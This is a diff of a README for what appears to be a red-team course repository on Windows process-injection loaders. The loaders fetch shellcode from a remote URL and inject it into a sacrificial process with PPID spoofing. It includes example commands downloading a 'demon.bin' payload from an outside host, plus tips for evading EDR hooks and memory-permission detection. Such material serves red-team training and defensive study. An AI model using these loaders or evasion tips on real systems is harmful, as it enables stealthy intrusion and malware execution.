@@ -7,7 +7,7 @@ Learn how to compromise an Active Directory Infrastructure by simulating adversa
 ### Runner
 Runner is the 1st out of 5 Proof-of-Concept Process Injectors that takes an arbitrary shellcode from a remote URL and perform shellcode injection on a sacrificial process `notepad.exe` using Win32 API calls. It also supports Parent Process ID (PPID) Spoofing, allowing the sacrificial process to spawn under an arbitrary process using it's PID. If the target `-t, --target` is not specified, it will perform self-injection instead.
 
-**OPSEC Tips:** Always close process handles and clean-up attribute lists if PPID spoofing is performed.
+**OPSEC Tips:** Allocating RWX region is a major outlier for detection as programs will rarely have memory region of RWX. Always allocate RW then flip it to RX.
 ```
 C:\>Runner.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
 
@@ -81,8 +81,6 @@ Clicker is a Proof-of-Concept loader for code injection using NT\*API calls to d
 | WriteProcessMemory | NtWriteVirtualMemory |
 | VirtualProtectEx   | NtProtectVirtualMemory |
 | CreateRemoteThread | NtCreateThreadEx |
-
-**OPSEC Tips:** Allocating RWX region is a major outlier for detection as programs will rarely have memory region of RWX. Always allocate RW then flip it to RX.
 ```
 C:\>Clicker.exe -u http://192.168.231.128:9090/demon.bin -t notepad -p 4160 -k
 
@@ -159,7 +157,7 @@ Process Injector 2: Clicker (Nt*API)
 ```
 
 ### Bloater
-Bloater is a wrapper used to side-load `Clicker` as a mean to demonstrate Process Mitigation Policy. This technique prevents security vendors from reflectively loading EDR DLLs that are not digitally signed by Microsoft. As a result, `kernel32.dll` and `ntdll.dll` of newly spawned processes will not be hooked by EDR vendors unless they have Intermediate Certificates handed out by Microsoft.
+Bloater is a wrapper used to side-load `Clicker` for demonstrating Process Mitigation Policy. This technique prevents security vendors from reflectively loading EDR DLLs that are not digitally signed by Microsoft. As a result, `kernel32.dll` and `ntdll.dll` of newly spawned processes will not be hooked by EDR vendors unless they have Intermediate Certificates handed out by Microsoft.
 ```
 C:\>Bloater.exe -f ./Clicker.exe -p 4160 -u http://192.168.231.128:9090/demon.bin -t notepad -s 4160
                                                                     _
@@ -307,7 +305,7 @@ Process Injector 4: RatKing (Manual Mapping ntdll.dll)
 ```
 
 ### RustKing
-RustKing is an adapted version of `RatKing` on steroids, written in Rust. The intention is to make Reverse Engineering significantly harder only.
+RustKing is an adapted version of `RatKing` on steroids, written in Rust. The intention is to make Reverse Engineering significantly harder.
 
 **NOTE:** RustKing does not support HTTPS payload download and PPID spoofing. Additionally, target process has to be opened manually prior to running RustKing. `--target` must be exact match.
 ```
